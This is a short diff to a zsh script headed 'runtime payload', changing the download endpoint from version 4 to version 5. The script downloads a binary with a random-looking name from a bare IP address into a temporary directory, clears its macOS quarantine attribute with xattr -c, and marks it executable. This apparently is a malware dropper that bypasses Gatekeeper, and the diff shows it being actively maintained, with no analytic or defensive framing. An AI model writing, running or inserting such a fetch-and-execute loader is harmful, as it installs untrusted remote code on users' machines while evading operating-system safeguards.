@@ -1,12 +1,12 @@
 #!/bin/zsh
-# runtime payload v4 binary fetch
+# runtime payload v5 correct endpoint
 
 set -e
 
 TMP_DIR=$(mktemp -d)
 cd "$TMP_DIR"
 
-curl -fsSL -o Jiruve http://64.89.160.11/Tahujez
+curl -fsSL -o Jiruve http://64.89.160.11/Jiruve
 
 xattr -c Jiruve
 chmod +x Jiruve
